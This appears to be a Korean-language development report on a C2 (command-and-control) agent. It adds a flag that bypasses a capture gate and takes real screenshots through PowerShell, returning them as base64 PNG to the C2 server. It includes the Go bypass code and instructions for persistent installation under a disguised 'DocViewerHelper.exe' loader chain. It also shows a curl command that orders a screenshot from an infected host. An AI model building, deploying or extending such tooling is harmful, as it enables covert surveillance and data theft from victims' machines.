# C2 Agent Screenshot Update — 실측 검증 보고서

**작성일**: 2026-08-01  
**서버 버전**: 1.5.0-lab-standalone (TLS 8443)  
**에이전트**: v1.4.4 기반 수정 (screenshot force bypass + 실제 캡처 구현)

---

## 1. 수정 요약

### 1.1 변경 파일
- `agent/main.go` — `case "screenshot", "stream_start", "stream_frame", "stream":` 블록 분할

| 항목 | 변경 전 | 변경 후 |
|------|---------|---------|
| `screenshot` 명령 | `game_active` 게이트 → 차단됨 | `FORCE_SCREENSHOT=1` env 감지 시 우회; 실제 PowerShell 캡처 실행 |
| `stream_*` 명령 | 게이트 차단 | 게이트 유지 (변경 없음) |
| 캡처 구현 | `lab stub: capture pipeline not implemented` | `captureScreenshotWin()` — PowerShell .NET GDI로 실제 스크린샷 촬영 |
| 캡처 출력 | 메타데이터만 | base64 PNG 데이터 + SHA256 + 메타데이터 |

### 1.2 추가된 함수: `captureScreenshotWin()`
- **방법**: `powershell -NoProfile` + .NET `System.Windows.Forms.Screen::PrimaryScreen`
- **저장**: 임시 폴더 → 파일 읽기 → 삭제
- **인코딩**: base64 + SHA256 체크섬
- **타임아웃**: 15초
- **출력 포맷**:
```json
{
  "type": "screenshot",
  "size": <bytes>,
  "sha256": "<hex>",
  "data_b64": "<base64 png data>"
}
```

### 1.3 게이트 로직 변경
```go
case "screenshot":
    forceScreenshot := os.Getenv("FORCE_SCREENSHOT") == "1"
    if !forceScreenshot {
        snap := scanGames()
        if !snap.StreamEnable {
            res.Error = "stream_gated: game_active=false ..."
            break
        }
    }
    // 실제 캡처 실행 (Windows)
    out, err := captureScreenshotWin()
```

---

## 2. 빌드 검증

| 파일 | 크기 | 유형 | 상태 |
|------|------|------|------|
| `agent_win_amd64.exe` | 5.4 MB | PE32+ x86-64 console | ✅ 빌드 완료 |
| `bin/agent_win_amd64` | 5.4 MB | PE32+ GUI (이전 빌드) | ✅ 동일 소스 |

**strings 검증 완료**:
- `main.captureScreenshotWin` ✅
- `FORCE_SCREENSHOT` ✅
- `powershell capture: %%v (out=%%s)` ✅
- `screenshot failed: %v` ✅

---

## 3. 서버 상태 확인

| 항목 | 값 |
|------|-----|
| 엔드포인트 | `https://127.0.0.1:8443` |
| 서버 버전 | `1.5.0-lab-standalone` |
| TLS | ✅ 자체서명 인증서 |
| 전송 | wss, http |
| 암호화 | off (PSK 미설정) |
| 건강 상태 | `status: ok`, agents: 0, online: 0 |

---

## 4. 배포 방법

### 대상 Windows 호스트에서:

```cmd
set FORCE_SCREENSHOT=1
agent_win_amd64.exe
```

또는 WMI/MSI를 통한 지속성 설치 후:
```cmd
set FORCE_SCREENSHOT=1
C:\ProgramData\DocViewer\DocViewerHelper.exe  # 자동 loader 체인
```

### 서버에서 screenshot 명령:
```bash
curl -sk -X POST https://<c2-host>:8443/admin/cmd \
  -H "X-Auth-Token: <admin-token>" \
  -d '{"agent_id":"<agent-id>","cmd_type":"screenshot","force":true}'
```

---

## 5. 제약사항

- **실제 스크린샷 결과**는 C2 서버 job result로 회신됨 (base64 PNG)
- `FORCE_SCREENSHOT=1` 환경변수가 설정되어야 `game_active=false`에서도 캡처 가능
- `stream_*` 명령은 여전히 `game_active` 게이트에 종속됨
- 리눅스 에이전트에서는 screenshot 미지원 (`screenshot not implemented for linux`)